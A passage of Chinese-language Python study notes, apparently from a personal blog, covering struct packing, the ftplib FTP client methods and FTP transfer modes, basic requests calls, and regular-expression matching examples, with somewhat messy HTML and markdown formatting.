class=\"built_in\">format</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> &#x27;Uses :&#x27;, s.size, &#x27;bytes&#x27;</span><br><span class=\"line\"><span class=\"built_in\">print</span> &#x27;Packed Value :&#x27;, binascii.hexlify(packed_data)</span><br><span class=\"line\"><span class=\"built_in\">print</span> &#x27;Unpacked <span class=\"built_in\">Type</span> :&#x27;, <span class=\"built_in\">type</span>(unpacked_data), &#x27; Value:&#x27;, unpacked_data</span><br></pre></td></tr></table></figure>\n<p><strong>Python 没有专门处理字节的数据类型。但由于 <code>b'str'</code>  可以表示字节，所以，字节数组＝二进制 str。而在 C 语言中，我们可以很方便地用 struct、union 来处理字节，以及字节和 int，float 的转换。</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 获取用户输入十进制数</span><br><span class=\"line\">dec &#x3D; int(input(&quot;输入数字：&quot;))</span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;十进制数为：&quot;, dec)</span><br><span class=\"line\">print(&quot;转换为二进制为：&quot;, bin(dec))</span><br><span class=\"line\">print(&quot;转换为八进制为：&quot;, oct(dec))</span><br><span class=\"line\">print(&quot;转换为十六进制为：&quot;, hex(dec))</span><br></pre></td></tr></table></figure>\n<p><strong>好在 Python 提供了一个 <code>struct</code>  模块来解决 <code>bytes</code>  和其他二进制数据类型的转换。</strong></p>\n<p><strong> <code>struct</code>  的 <code>pack</code>  函数把任意数据类型变成 <code>bytes</code> ：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; import struct</span><br><span class=\"line\">&gt;&gt;&gt; struct.pack(&#39;&gt;I&#39;, 10240099)</span><br><span class=\"line\">b&#39;\\x00\\x9c@c&#39;</span><br></pre></td></tr></table></figure>\n<p><strong>后面的参数个数要和处理指令一致。</strong></p>\n<p><strong> <code>pack</code>  的第一个参数是处理指令， <code>'&gt;I'</code>  的意思是：</strong></p>\n<p><strong> <code>&gt;</code>  表示字节顺序是 big-endian，也就是网络序， <code>I</code>  表示 4 字节无符号整数。</strong></p>\n<p><strong>后面的参数个数要和处理指令一致。</strong></p>\n<p><strong><img data-src=\"https://img-blog.csdn.net/20180523160441215?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjM4ODMx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"img\"></strong></p>\n<h2 id=\"ftplib模块\"><a class=\"markdownIt-Anchor\" href=\"#ftplib模块\">#</a> <strong>ftplib 模块</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121174909380.png\" alt=\"image-20201121174909380\"></strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">email</span><br><span class=\"line\">电子邮件处理的包（也支持 MIME）</span><br><span class=\"line\">rfc822</span><br><span class=\"line\">RFC2822 邮件头解析器</span><br><span class=\"line\">smtpd</span><br><span class=\"line\">SMTP 服务器</span><br><span class=\"line\">base64</span><br><span class=\"line\">Base <span class=\"number\">16</span>、<span class=\"number\">32</span> 和 <span class=\"number\">64</span> 数据编码（RFC <span class=\"number\">3548</span>）</span><br><span class=\"line\">mhlib</span><br><span class=\"line\">处理 MH 文件夹和信息的类</span><br><span class=\"line\">mailbox</span><br><span class=\"line\">支持 mailbox 文件格式解析的类</span><br><span class=\"line\">mailcap</span><br><span class=\"line\">“mailcap”文件的处理模块</span><br><span class=\"line\">mimetools</span><br><span class=\"line\">（不建议使用）MIME 信息解析工具（使用上面的 email）</span><br><span class=\"line\">mimetypes</span><br><span class=\"line\">在文件名或 URL 到相关的 MIME 类型之间转换的模块</span><br><span class=\"line\">MimeWriter</span><br><span class=\"line\">（不建议使用）MIME 信息处理模块（使用上面的 email）</span><br><span class=\"line\">mimify</span><br><span class=\"line\">（不建议使用）信息的 MIME 处理工具（使用上面的 email）</span><br><span class=\"line\">binascii</span><br><span class=\"line\">二进制和 ASCII 转换</span><br><span class=\"line\">binhex</span><br><span class=\"line\">Binhex <span class=\"number\">4</span> 编码和解码支持</span><br><span class=\"line\"><span class=\"number\">17</span>.<span class=\"number\">5</span>.<span class=\"number\">2</span> 其他网络协议</span><br><span class=\"line\">表 <span class=\"number\">17</span>.<span class=\"number\">6</span></span><br><span class=\"line\">模 块</span><br><span class=\"line\">描 述</span><br><span class=\"line\">ftplib</span><br><span class=\"line\">FTP 协议客户端</span><br><span class=\"line\">gopherlib</span><br><span class=\"line\">Gopher 协议客户端</span><br><span class=\"line\">httplib</span><br><span class=\"line\">HTTP 和 HTTPS 协议客户端</span><br><span class=\"line\">imaplib</span><br><span class=\"line\">IMAP4 协议客户端</span><br><span class=\"line\">nntplib</span><br><span class=\"line\">NNTP 协议客户端</span><br><span class=\"line\">poplib</span><br><span class=\"line\">POP3 协议客户端</span><br><span class=\"line\">smtplib</span><br><span class=\"line\">SMTP 协议客户端</span><br><span class=\"line\">telnetlib</span><br><span class=\"line\">Telnet 协议客户端类</span><br></pre></td></tr></table></figure>\n<p><strong>ftplib 模块中定义了基于 FTP 协议的 FTP 类，可以进行一些 FTP 工作。以下是一些 FTP 接口的说明。</strong></p>\n<ul>\n<li>\n<p><em><em><em>class</em> ftplib.FTP(</em> <code>host='', user='', passwd='', acct='', timeout=None, source_address=None</code> </em>)***</p>\n<table>\n<thead>\n<tr>\n<th><strong>参数</strong></th>\n<th><strong>方法</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>host</strong></td>\n<td><strong>调用 connect (host) 方法</strong></td>\n</tr>\n<tr>\n<td><strong>user</strong></td>\n<td><strong>调用 login (user, passwd, acct) 方法</strong></td>\n</tr>\n<tr>\n<td><strong>timeout</strong></td>\n<td><strong>超时参数，若不指定则应用全局超时参数</strong></td>\n</tr>\n<tr>\n<td><strong>source_address</strong></td>\n<td><strong>二元组 (host, port)，连接前绑定的 socket 源地址</strong></td>\n</tr>\n</tbody>\n</table>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下是FTP类的方法说明</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th><strong>方法</strong></th>\n<th><strong>参数</strong></th>\n<th><strong>说明</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>FTP.set_debuglevel(<em> <code>level</code> </em>)</strong></td>\n<td><strong> <code>0</code> ：默认，无调试输出； <code>1</code> ：中等调试输出； <code>2</code> ：最大量 调试输出</strong></td>\n<td><strong>该方法用来控制调试输出的量</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.connect(<em> <code>host='', port=0, timeout=None, source_address=None</code> </em>)</strong></td>\n<td><strong> <code>host</code> ：主机地址； <code>port</code> : 根据 FTP 协议默认端口为 <code>21</code> ； <code>timeout</code> ：若不指定则使用 <code>全局超时参数</code> </strong></td>\n<td><strong>用于链接 FTP 服务器，链接成功后无需再调用</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.login(<em> <code>user='anonymous', passwd='', acct=''</code> </em>)</strong></td>\n<td><strong>参数指定用户名和密码，若未指定则匿名访问。 <code>user：'anonymous'，passwd：'anonymous@'</code> </strong></td>\n<td><strong>只有在链接 FTP 服务器时用以验证使用</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.abort()</strong></td>\n<td><strong>无参数</strong></td>\n<td><strong>中断文件传输操作，不一定管用，尝试而已</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.getwelcome()</strong></td>\n<td><strong>无参数</strong></td>\n<td><strong>链接成功返回 “welcome” 信息</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.sendcmd(<em> <code>cmd</code> </em>)</strong></td>\n<td></td>\n<td><strong>发送简单命令给服务器，并返回相应字符串</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.voidcmd(<em> <code>cmd</code> </em>)</strong></td>\n<td></td>\n<td><strong>发送简单命令，并处理响应，若响应时成功码，啥也不返回，否则 raise  <code>error_replly</code> </strong></td>\n</tr>\n<tr>\n<td><strong>FTP.retrbinary(<em> <code>cmd, callback, blocksize=8192, rest=None</code> </em>)</strong></td>\n<td><strong> <code>cmd</code> ：RETR 命令， <code>callback</code> ：获取的数据块将要调用的函数， <code>blocksize</code> ：数据块的最大尺寸， <code>rest</code> ：</strong></td>\n<td><strong>以 <code>BINARY模式</code> 获取文件，</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.retrlines(<em> <code>cmd, callback=None</code> </em>)</strong></td>\n<td><strong> <code>cmd</code> ： <code>RETR</code>  命令</strong></td>\n<td><strong>以 <code>ASCII</code>  模式获取文件或者文件夹列表</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.set_pasv(<em> <code>val</code> </em>)</strong></td>\n<td><strong> <code>true</code> ：允许被动模式， <code>false</code> ：禁用被动模式。默认允许</strong></td>\n<td><strong>允许或者禁用被动模式</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.storbinary(<em> <code>cmd, fp, blocksize=8192, callback=None, rest=None</code> </em>)</strong></td>\n<td><strong> <code>cmd</code> ：合适的 <code>STOR</code>  命令。 <code>fp</code> ：文件对象，以 <code>read（）</code> 方法读取文件直到 EOF，以供存储。 <code>blocksize</code> ：数据块大小。 <code>callback</code> ：对数据块进行处理的方法。 <code>rest</code> ：</strong></td>\n<td><strong>以 <code>BINARY</code>  模式存储文件</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.storlines(<em> <code>cmd, fp, callback=None</code> </em>)</strong></td>\n<td><strong> <code>cmd</code> ：合适的 <code>STOR</code>  命令。 <code>fp</code> ：文件对象，以 <code>readline（）</code> 方法读取文件直到 EOF，以供存储。 <code>blocksize</code> ：数据块大小。 <code>callback</code> ：对数据块进行处理的方法。 <code>rest</code> ：</strong></td>\n<td><strong>以 <code>ASCII</code>  模式存储文件</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.transfercmd(<em> <code>cmd, rest=None</code> </em>)</strong></td>\n<td><strong>cmd：传输命令，rest：REST 命令</strong></td>\n<td><strong>开启数据连接， <code>主动模式</code> 下发送 <code>EPRT</code>  或者 <code>PORT</code>  命令，并通过 cmd 发送传输命令，接受连接， <code>被动模式</code> 下发送 <code>EPSV</code>  或者 <code>PASV</code>  命令，连接服务器并通过 cmd 发送传输命令。两种模式下都要返回 <code>socket套接字</code> </strong></td>\n</tr>\n<tr>\n<td><strong>FTP.ntransfercmd(<em> <code>cmd, rest=None</code> </em>)</strong></td>\n<td></td>\n<td><strong>返回一个包含数据连接和期望数据大小的元组</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.mlsd(<em> <code>path=&quot;&quot;, facts=[]</code> </em>)</strong></td>\n<td><strong> <code>path</code> ：文件夹路径， <code>facts</code> ：期望信息字段列表</strong></td>\n<td><strong>用 <code>MSLD</code>  命令获取文件下的文件信息列表，返回包含文件名称和对应信息的元组，其中部分期望信息可能未获得服务器允许</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.nlst(<em> <code>argument[, ...]</code> </em>)</strong></td>\n<td><strong> <code>argument</code> ：文件夹路径</strong></td>\n<td><strong>使用 <code>NLST</code>  命令获取文件夹下的文件名称列表</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.dir(<em> <code>argument[, ...]</code> </em>)</strong></td>\n<td><strong> <code>argument</code> ：文件夹路径</strong></td>\n<td><strong>使用 <code>LIST</code>  命令获取某路径下的文件夹列表，默认为当前目录</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.rename(<em> <code>fromname, toname</code> </em>)</strong></td>\n<td><strong> <code>fromname</code> ：旧名称； <code>toname</code> ：新名称</strong></td>\n<td><strong>修改文件名称</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.delete(<em> <code>filename)</code> </em></strong></td>\n<td><strong> <code>filename</code> ：文件名</strong></td>\n<td><strong>移除服务器中的某文件，若成功返回 <code>响应文本</code> ，否则返回 <code>error_perm</code> （许可错误） 或  <code>error_reply</code> （其他错误）</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.cwd(<em> <code>pathname</code> </em>)</strong></td>\n<td><strong> <code>pathname</code> ：文件夹路径</strong></td>\n<td><strong>设置当前文件夹</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.mkd(<em> <code>pathname</code> </em>)</strong></td>\n<td><strong> <code>pathname</code> ：文件夹路径</strong></td>\n<td><strong>服务器中新建文件夹</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.pwd()</strong></td>\n<td></td>\n<td><strong>返回当前文件夹的路径</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.rmd(<em> <code>dirname</code> </em>)</strong></td>\n<td><strong> <code>dirname</code> ：文件夹名称</strong></td>\n<td><strong>移除某个文件夹</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.size(<em> <code>filename</code> </em>)</strong></td>\n<td><strong> <code>filename</code> ：文件名</strong></td>\n<td><strong>请求文件大小，若请求成功则返回整数，否则返回 None；该命令非标准命令，但很多服务器支持</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.quit()</strong></td>\n<td><strong>无参数</strong></td>\n<td><strong>向服务器发送 <code>QUIT</code>  命令后，关闭连接，若服务器无法识别该命令，会响应错误</strong></td>\n</tr>\n<tr>\n<td><strong>FTP.close()</strong></td>\n<td><strong>无参数</strong></td>\n<td><strong>单方面关闭连接，无法重复关闭连接</strong></td>\n</tr>\n</tbody>\n</table>\n<p><em><em><em>class</em> ftplib.FTP_TLS(</em> <code>host='', user='', passwd='', acct='', keyfile=None, certfile=None, context=None, timeout=None, source_address=None</code> </em>)**<br>\n<strong> 该类是 FTP 类的子类，自 3.2 版本后增加了 tls 安全传输层协议，一下是该类的方法说明</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FTP_TLS.ssl_version()\t使用的SSL的版本</span><br><span class=\"line\">FTP_TLS.auth()\t使用TLS或者SSL建立安全控制链接，取决于ssl_version()方法</span><br><span class=\"line\">FTP_TLS.ccc()\t</span><br><span class=\"line\">FTP_TLS.prot_p()\t建立安全的数据连接</span><br><span class=\"line\">FTP_TLS.prot_c()\t建立明文数据连接</span><br></pre></td></tr></table></figure>\n<p><strong>FTP 有两种传输模式：ASCII 传输模式和 BINARY 传输模式。</strong></p>\n<ul>\n<li>\n<pre><code>- ASCII传输模式：\n  该方式可以根据服务器系统对文件进行自动调整，将原始文件的回车换行转换为系统对应的回车字符，比如Unix下是\\n,Windows下是\\r\\n，Mac下是\\r。`CGI脚本`和`普通HTML文件`（或其他文本文件）用ASCII模式上传，而其他的一些文件则使用二进制传输模式。\n- BINARY传输模式：\n  在二进制传输中，保存文件的位序，以便原始和拷贝的是逐位一一对应的。即使目的地机器上包含位序列的文件是没意义的。例如，macintosh以二进制方式传送可执行文件到Windows系统，在对方系统上，此文件不能执行。如果你在ASCII方式下传输二进制文件，即使不需要也仍会转译。这会使传输稍微变慢 ，也会损坏数据，使文件变得不能用。（在大多数计算机上，ASCII方式一般假设每一字符的第一有效位无意义，因为ASCII字符组合不使用它。如果你传输二进制文件，所有的位都是重要的。）如果你知道这两台机器具有相同的系统，则二进制方式对文本文件和数据文件都是有效的。\n- 列举：\n  - ASCII传输模式：用HTML和文本编写的文件必须用ASCII模式上传\n  - 二进制传输模式：BINARY模式用来传送可执行文件，压缩文件，和图片文件\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">- &#96;&#96;&#96;</span><br><span class=\"line\">  FTP支持两种模式：一种方式叫做Standard (也就是 PORT方式，主动方式)， Standard模式下 FTP的客户端发送 PORT 命令到FTP服务器。另一种是 Passive (也就是PASV，被动方式) ，Passive模式下FTP的客户端发送 PASV命令到 FTP Server。</span><br><span class=\"line\">  </span><br><span class=\"line\">  Standard模式：</span><br><span class=\"line\">  Port模式FTP 客户端首先和FTP服务器的TCP 21端口建立连接，通过这个通道发送命令，客户端需要接收数据的时候在这个通道上发送PORT命令。 PORT命令包含了客户端用什么端口接收数据。在传送数据的时候，服务器端通过自己的TCP 20端口连接至客户端的指定端口发送数据。 FTP server必须和客户端建立一个新的连接用来传送数据。（可以看到在这种方式下是客户端和服务器建立控制连接，服务器向客户端建立数据连接，其中，客户端的控制连接和数据连接的端口号是大于1024的两个端口号（临时端口），而FTP服务器的数据端口为20，控制端口为21）</span><br><span class=\"line\">  Passive模式：</span><br><span class=\"line\">  Passive模式在建立控制通道的时候和Standard模式类似，但建立连接后发送的不是Port命令，而是Pasv命令。FTP服务器收到Pasv命令后，随机打开一个临时端口（也叫自由端口，端口号大于1023小于65535）并且通知客户端在这个端口上传送数据的请求，客户端连接FTP服务器此端口，然后FTP服务器将通过这个端口进行数据的传送，这个时候FTP server不再需要建立一个新的和客户端之间的连接。（可以看到这种情况下的连接都是由客户端向服务器发起的，与下面所说的“为了解决服务器发起到客户的连接的问题，人们开发了一种不同的FTP连接方式。这就是所谓的被动方式”相对应，而服务器端的数据端口是临时端口，而不是常规的20）</span><br><span class=\"line\">  注意：很多防火墙在设置的时候都是不允许接受外部发起的连接的，所以许多位于防火墙后或内网的FTP服务器不支持PASV模式，因为客户端无法穿过防火墙打开FTP服务器的高端端口；而许多内网的客户端不能用PORT模式登陆FTP服务器，因为从服务器的TCP 20无法和内部网络的客户端建立一个新的连接，造成无法工作。</span><br><span class=\"line\">  &#96;&#96;&#96;</span><br><span class=\"line\"></span><br><span class=\"line\">## **request模块**</span><br><span class=\"line\"></span><br><span class=\"line\">**requests里提供了各种请求方式，比如：get，post，delete，put，具体如下所示：**</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;&#96;&#96;cmd</span><br><span class=\"line\">import requests </span><br><span class=\"line\">requests.post(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;) </span><br><span class=\"line\">requests.put(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;put&quot;) </span><br><span class=\"line\">requests.delete(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;delete&quot;) </span><br><span class=\"line\">requests.get(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;) </span><br><span class=\"line\">&#96;&#96;&#96;</span><br><span class=\"line\"></span><br><span class=\"line\">**在使用requests时，无论你使用的请求方法是get也好，post也罢，他们都会给你返回一个响应的对象，而针对这个对象有一些特定的方法，能够让你进一步解析响应从而得到你想要的数据，如下：**</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;&#96;&#96;&#96;cmd</span><br><span class=\"line\">response.json() 　　　　　　　　　　# 以json的形式返回响应内容，对象格式为dict response.content 　　　　　　　　　 # 以二进制的形式返回响应内容，对象格式为bytes response.text 　　　　　　　　　　　# 以字符串的形式返回响应内容，对象格式为str response.url 　　　　　　　　　　　　# 返回请求的url response.status_code 　　　　　　　# 返回本次请求的状态码 response.reason 　　　　　　　　　　# 返回状态码对应的原因 response.headers 　　　　　　　　　# 返回响应头 response.cookies 　　　　　　　　　# 返回cookice信息 response.raw 　　　　　　　　　　　# 返回原始响应体 response.encoding 　　　　　　　　# 返回编码格式</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n</code></pre>\n</li>\n</ul>\n<h2 id=\"正则表达式\"><a class=\"markdownIt-Anchor\" href=\"#正则表达式\">#</a> <strong>正则表达式</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121170358585.png\" alt=\"image-20201121170358585\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121170409573.png\" alt=\"image-20201121170409573\"></strong></p>\n<h2 id=\"特殊字符表示字符集\"><a class=\"markdownIt-Anchor\" href=\"#特殊字符表示字符集\">#</a> <strong>特殊字符表示 (字符集)</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121170600029.png\" alt=\"image-20201121170600029\"></strong></p>\n<p><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201122142617744.png\" alt=\"image-20201122142617744\"></p>\n<p><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201122142847883.png\" alt=\"image-20201122142847883\"></p>\n<h2 id=\"常用函数和方法\"><a class=\"markdownIt-Anchor\" href=\"#常用函数和方法\">#</a> <strong>常用函数和方法</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201121170714542.png\" alt=\"image-20201121170714542\"></strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; m = re.match(&#x27;foo&#x27;, &#x27;foo&#x27;)</span><br><span class=\"line\">#模式匹配字符串</span><br><span class=\"line\">&gt;&gt;&gt; <span class=\"keyword\">if</span> m is <span class=\"keyword\">not</span> None:</span><br><span class=\"line\">#如果成功，显示匹配</span><br><span class=\"line\">... m.group()</span><br><span class=\"line\">...</span><br><span class=\"line\">&#x27;foo&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201122145049966.png\" alt=\"image-20201122145049966\"></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这是当匹配失败时的例子，它返回 None：</span><br><span class=\"line\">&gt;&gt;&gt; m = re.match(&#x27;foo&#x27;, &#x27;bar&#x27;)</span><br><span class=\"line\">#模式不匹配字符串</span><br><span class=\"line\">&gt;&gt;&gt; <span class=\"keyword\">if</span> m is <span class=\"keyword\">not</span> None: m.group()</span><br><span class=\"line\">#<span class=\"number\">1</span> 行的 <span class=\"keyword\">if</span> 子句  不显示</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; m = re.search(&#x27;foo&#x27;, &#x27;seafood&#x27;)</span><br><span class=\"line\">#改用 search()</span><br><span class=\"line\">&gt;&gt;&gt; <span class=\"keyword\">if</span> m is <span class=\"keyword\">not</span> None: m.group()</span><br><span class=\"line\">...</span><br><span class=\"line\">&#x27;foo&#x27;</span><br><span class=\"line\">#用 search 成功匹配，用 match 匹配失败</span><br><span class=\"line\">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>创建字符集合（[ ]）</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;&gt;&gt;&gt; m &#x3D; re.match(&#39;[cr][23][dp][o2]&#39;, &#39;c3po&#39;)</span><br><span class=\"line\">#匹配&#39;c3po&#39;</span><br><span class=\"line\">&gt;&gt;&gt; if m is not None: m.group()</span><br><span class=\"line\">...</span><br><span class=\"line\">&#39;c3po&#39;</span><br><span class=\"line\">&gt;&gt;&gt; m &#x3D; re.match(&#39;[cr][23][dp][o2]&#39;, &#39;c2do&#39;)</span><br><span class=\"line\">#匹配&#39;c2do&#39;</span><br><span class=\"line\">&gt;&gt;&gt; if m is not None: m.group()</span><br><span class=\"line\">...</span><br><span class=\"line\">&#39;c2do&#39;</span><br><span class=\"line\">&gt;&gt;&gt; m &#x3D; re.match(&#39;r2d2|c3po&#39;, &#39;c2do&#39;)</span><br><span class=\"line\">#不匹配&#39;c2do&#39;</span><br><span class=\"line\">&gt;&gt;&gt; if m is not None: m.group()</span><br><span class=\"line\">...</span><br><span class=\"line\">&gt;&gt;&gt; m &#x3D; re.match(&#39;r2d2|c3po&#39;, &#39;r2d2&#39;)</span><br><span class=\"line\">#匹配&#39;r2d2&#39;</span><br><span class=\"line\">&gt;&gt;&gt; if m is not None: m.group()</span><br><span class=\"line\">...</span><br><span class=\"line\">&#39;r2d2&#39;&#39;</span><br></pre></td></tr></table></figure>\n<p><strong>findall</strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; m = re.match(&#x27;[cr][<span class=\"number\">23</span>][dp][o2]&#x27;, &#x27;c3po&#x27;)</span><br><span class=\"line\">#匹配&#x27;c3po&#x27;</span><br><span class=\"line\">&gt;&gt;&gt; <span class=\"keyword\">if</span> m is <span class=\"keyword\">not</span> None: m.group()</span><br><span class=\"line\">...</span><br><span class=\"line\">&#x27;c3po&#x27;</span><br><span class=\"line\">&gt;&gt;&gt; m = re.match(&#x27;[cr][<span class=\"number\">23</span>][dp][o2]&#x27;, &#x27;c2do&#x27;)</span><br><span class=\"line\">#匹配&#x27;c2do&#x27;</span><br><span class=\"line\">&gt;&gt;&gt; <span class=\"keyword\">if</span> m is <span class=\"keyword\">not</span> None: m.group()</span><br><span class=\"line\">...</span><br><span class=\"line\">&#x27;c2do&#x27;</span><br><span class=\"line\">&gt;&gt;&gt; m = re.match(&#x27;r2d2|c3po&#x27;, &#x27;c2do&#x27;)</span><br><span class=\"line\">#不匹配&#x27;c2do&#x27;</span><br><span class=\"line\">&gt;&gt;&gt; <span class=\"keyword\">if</span> m is <span class=\"keyword\">not</span> None: m.group()</span><br><span 